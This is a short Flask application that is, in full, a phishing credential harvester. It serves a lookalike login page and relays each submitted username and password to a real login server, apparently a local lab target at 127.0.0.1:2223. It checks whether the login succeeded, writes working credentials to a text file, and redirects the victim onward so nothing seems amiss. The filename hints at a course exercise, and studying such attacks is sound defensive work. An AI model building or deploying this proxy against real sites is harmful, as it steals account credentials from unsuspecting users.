from flask import Flask, redirect, render_template, request
import requests

app = Flask(__name__)

@app.route('/')
def home():
    return render_template("customsite.html")

@app.route('/login', methods=['POST'])
def login():
    username, password = request.form.get("username"), request.form.get("password")

    data = {
            "username": username,
            "password": password,
            "submit": "submit"
    }

    try:
        session = requests.Session()
        response = session.post("http://127.0.0.1:2223", data=data)
        if "You Logged In" in response.text:
            with open("Q4_managementpage.txt", "a") as file: file.write(f"({username}, {password})\n")
            return redirect("http://127.0.0.1:2223", code=307)
        else:
            return "Wrong username or password."
    except requests.exceptions.RequestException as e:
        return "Error connecting to the remote server."

if __name__ == "__main__":
    app.run(debug=True)